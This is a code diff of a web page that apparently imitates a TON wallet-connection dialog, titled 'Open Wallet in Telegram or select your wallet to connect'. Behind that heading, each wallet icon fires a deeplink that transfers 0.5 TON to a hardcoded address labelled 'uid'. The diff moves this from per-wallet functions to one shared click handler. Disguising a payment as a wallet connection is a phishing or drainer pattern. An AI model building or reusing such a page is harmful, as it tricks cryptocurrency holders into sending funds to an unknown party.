@@ -196,24 +196,33 @@
 <h2 class="go2054811827 go1288530941" data-tc-h2="true">Open Wallet in Telegram or select your wallet to connect</h2>
 <button class="wallet-button" onclick="openTelegramWallet()">Open Wallet in Telegram</button>
 <div class="wallet-options">
-    <figure>
-        <img src="./img/tonkeeper.png" alt="Tonkeeper" onclick="openWallet('https://tonkeeper.com')">
+    <!-- Tonkeeper -->
+    <figure data-wallet="tonkeeper://transfer">
+        <img src="./img/tonkeeper.png" alt="Tonkeeper">
         <figcaption>Tonkeeper</figcaption>
     </figure>
-    <figure>
-        <img src="./img/tonwallet.png" alt="MyTonWallet" onclick="openWallet('https://mytonwallet.org')">
+
+    <!-- MyTonWallet -->
+    <figure data-wallet="mytonwallet://transfer">
+        <img src="./img/tonwallet.png" alt="MyTonWallet">
         <figcaption>MyTonWallet</figcaption>
     </figure>
-    <figure>
-        <img src="./img/tonhub.png" alt="Tonhub" onclick="openWallet('https://tonhub.com')">
+
+    <!-- Tonhub -->
+    <figure data-wallet="tonhub://transfer">
+        <img src="./img/tonhub.png" alt="Tonhub">
         <figcaption>Tonhub</figcaption>
     </figure>
-    <figure>
-        <img src="./img/dwallet.png" alt="DeWallet" onclick="openWallet('https://dewallet.com')">
+
+    <!-- DeWallet -->
+    <figure data-wallet="dewallet://transfer">
+        <img src="./img/dwallet.png" alt="DeWallet">
         <figcaption>DeWallet</figcaption>
     </figure>
+
+    <!-- View all wallets -->
     <figure>
-        <img onclick="openModal('allWalletsModal')">
+        <img src="" alt="View all wallets" onclick="openModal('allWalletsModal')">
         <figcaption>View all wallets</figcaption>
     </figure>
 </div>
@@ -226,47 +235,66 @@
             <span class="close" onclick="closeModal('allWalletsModal')">&times;</span>
             <h2>All Wallets</h2>
             <div class="wallet-options">
-                <figure>
-                    <img src="./img/telegramwallet.png" alt="Wallet on Telegram" onclick="openTelegramWallet()">
+                <!-- Wallet on Telegram -->
+                <figure data-wallet="ton://transfer">
+                    <img src="./img/telegramwallet.png" alt="Wallet on Telegram">
                     <figcaption>Wallet on Telegram</figcaption>
                 </figure>
-                <figure>
-                    <img src="./img/tonkeeper.png" alt="Tonkeeper" onclick="openTonkeeper()">
+            
+                <!-- Tonkeeper -->
+                <figure data-wallet="tonkeeper://ton-transfer">
+                    <img src="./img/tonkeeper.png" alt="Tonkeeper">
                     <figcaption>Tonkeeper</figcaption>
                 </figure>
-                <figure>
-                    <img src="./img/tonwallet.png" alt="MyTonWallet" onclick="openMyTonWallet()">
+            
+                <!-- MyTonWallet -->
+                <figure data-wallet="mytonwallet://transfer">
+                    <img src="./img/tonwallet.png" alt="MyTonWallet">
                     <figcaption>MyTonWallet</figcaption>
                 </figure>
-                <figure>
-                    <img src="./img/tonhub.png" alt="Tonhub" onclick="openTonhub()">
+            
+                <!-- Tonhub -->
+                <figure data-wallet="tonhub://transfer">
+                    <img src="./img/tonhub.png" alt="Tonhub">
                     <figcaption>Tonhub</figcaption>
                 </figure>
-                <figure>
-                    <img src="./img/dwallet.png" alt="DeWallet" onclick="openDeWallet()">
+            
+                <!-- DeWallet -->
+                <figure data-wallet="dewallet://transfer">
+                    <img src="./img/dwallet.png" alt="DeWallet">
                     <figcaption>DeWallet</figcaption>
                 </figure>
-                <figure>
-                    <img src="./img/bitget_wallet_logo_0_gas_fee.png" alt="Bitget Wallet" onclick="openBitgetWallet()">
+            
+                <!-- Bitget Wallet -->
+                <figure data-wallet="bitgetwallet://transfer">
+                    <img src="./img/bitget_wallet_logo_0_gas_fee.png" alt="Bitget Wallet">
                     <figcaption>Bitget Wallet</figcaption>
                 </figure>
-                <figure>
-                    <img src="./img/SafePal_x288.png" alt="SafePal" onclick="openSafePal()">
+            
+                <!-- SafePal -->
+                <figure data-wallet="safepal://transfer">
+                    <img src="./img/SafePal_x288.png" alt="SafePal">
                     <figcaption>SafePal</figcaption>
                 </figure>
-                <figure>
-                    <img src="./img/okxwallet.png" alt="OKX Wallet" onclick="openOkxWallet()">
+            
+                <!-- OKX Wallet -->
+                <figure data-wallet="okxwallet://transfer">
+                    <img src="./img/okxwallet.png" alt="OKX Wallet">
                     <figcaption>OKX Wallet</figcaption>
                 </figure>
-                <figure>
-                    <img src="./img/okxtrwallet.png" alt="OKX Tr Wallet" onclick="openOkxTrWallet()">
+            
+                <!-- OKX Tr Wallet -->
+                <figure data-wallet="okxtrwallet://transfer">
+                    <img src="./img/okxtrwallet.png" alt="OKX Tr Wallet">
                     <figcaption>OKX Tr Wallet</figcaption>
                 </figure>
-                <figure>
-                    <img src="./img/hot.png" alt="HOT" onclick="openHOTWallet()">
-                    <figcaption>HOT</figcaption>
+            
+                <!-- HOT Wallet -->
+                <figure data-wallet="hotwallet://transfer">
+                    <img src="./img/hot.png" alt="HOT Wallet">
+                    <figcaption>HOT Wallet</figcaption>
                 </figure>
-            </div>            
+            </div>
         </div>
     </div>
 
@@ -282,47 +310,30 @@
 
     <script>
         const uid = "QCwDpTnJclQCsiJ6cLqqhr97LWX4RklOAWr3eBBENsilJhM";
-const amount = 0.5;
+        const amount = 0.5; // TON amount to transfer
 
-function openTelegramWallet() {
-    window.location.href = `https://t.me/wallet?start=send_${uid}_${amount}`;
-}
+        // Function to handle wallet click and open the appropriate link
+        function openWallet(walletUrl) {
+            // Construct the deeplink URL with uid and amount
+            const deeplink = `${walletUrl}/${uid}?amount=${amount}`;
+            window.location.href = deeplink;
+        }
 
-function openTonkeeper() {
-    window.location.href = `tonkeeper://transfer/${uid}?amount=${amount}`;
-}
+        // Add event listeners to each wallet option
+        document.querySelectorAll('.wallet-options figure[data-wallet]').forEach(figure => {
+            figure.addEventListener('click', () => {
+                const wallet = figure.getAttribute('data-wallet');
+                openWallet(wallet);
+            });
+        });
 
-function openMyTonWallet() {
-    window.location.href = `https://app.tonkeeper.com/transfer/${uid}?amount=${amount}`;
-}
-
-function openTonhub() {
-    window.location.href = `tonhub://transfer/${uid}?amount=${amount}`;
-}
-
-function openDeWallet() {
-    window.location.href = `dewallet://transfer/${uid}?amount=${amount}`;
-}
-
-function openBitgetWallet() {
-    window.location.href = `bitgetwallet://transfer/${uid}?amount=${amount}`;
-}
-
-function openSafePal() {
-    window.location.href = `safepal://transfer/${uid}?amount=${amount}`;
-}
-
-function openOkxWallet() {
-    window.location.href = `okxwallet://transfer/${uid}?amount=${amount}`;
-}
-
-function openOkxTrWallet() {
-    window.location.href = `okxtrwallet://transfer/${uid}?amount=${amount}`;
-}
-
-function openHOTWallet() {
-    window.location.href = `hotwallet://transfer/${uid}?amount=${amount}`;
-}
+        // Function to open the modal (you need to implement this function if not already done)
+        function openModal(modalId) {
+            const modal = document.getElementById(modalId);
+            if (modal) {
+                modal.style.display = 'block';
+            }
+        }
 
         function openModal(modalId) {
             document.getElementById(modalId).style.display = "block";
